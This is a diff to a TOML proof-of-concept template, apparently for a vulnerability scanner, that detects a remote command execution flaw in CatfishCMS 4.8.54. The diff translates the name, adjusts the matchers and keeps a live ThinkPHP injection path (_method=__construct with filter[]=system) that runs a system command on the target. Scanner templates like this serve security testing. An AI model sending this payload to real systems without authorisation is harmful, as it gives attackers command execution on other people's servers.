@@ -1,10 +1,10 @@
 [info]
 id = "POC-AVE-2026-0030"
-name = "CatfishCMS 4.8.54 远程命令执行 PoC"
+name = "CatfishCMS 4.8.54 Remote Command Execution PoC"
 author = "AVE"
 severity = "critical"
-tags = ["rce", "command-injection", "thinkphp", "catfishcms"]
-description = "CatfishCMS（鲶鱼CMS）4.8.54 版本存在远程命令执行漏洞，攻击者可通过构造特制的 HTTP 请求，利用 ThinkPHP 框架 _method=__construct 参数处理缺陷，通过 filter[]=system 参数实现任意系统命令执行。"
+tags = ["rce", "command-injection", "thinkphp"]
+description = "CatfishCMS 4.8.54 存在远程命令执行漏洞，通过 ThinkPHP 参数注入（_method=__construct + filter[]=system）实现任意系统命令执行"
 vuln_id = ["CNVD-2019-06255", "AVE-2026-0030"]
 
 [poc]
@@ -17,7 +17,7 @@ path = "/"
 [[poc.requests.matchers]]
 type = "word"
 part = "body"
-words = ["Catfish CMS"]
+words = ["content=\"Catfish CMS"]
 expect = true
 
 [[poc.requests]]
@@ -25,13 +25,13 @@ method = "GET"
 path = "/s=set&_method=__construct&method=*&filter[]=system"
 
 [[poc.requests.matchers]]
-type = "status"
-status = [200]
-expect = true
-
-[[poc.requests.matchers]]
 type = "word"
 part = "body"
 words = ["OS", "PATH", "SHELL", "USER"]
 condition = "and"
+expect = true
+
+[[poc.requests.matchers]]
+type = "status"
+status = [200]
 expect = true
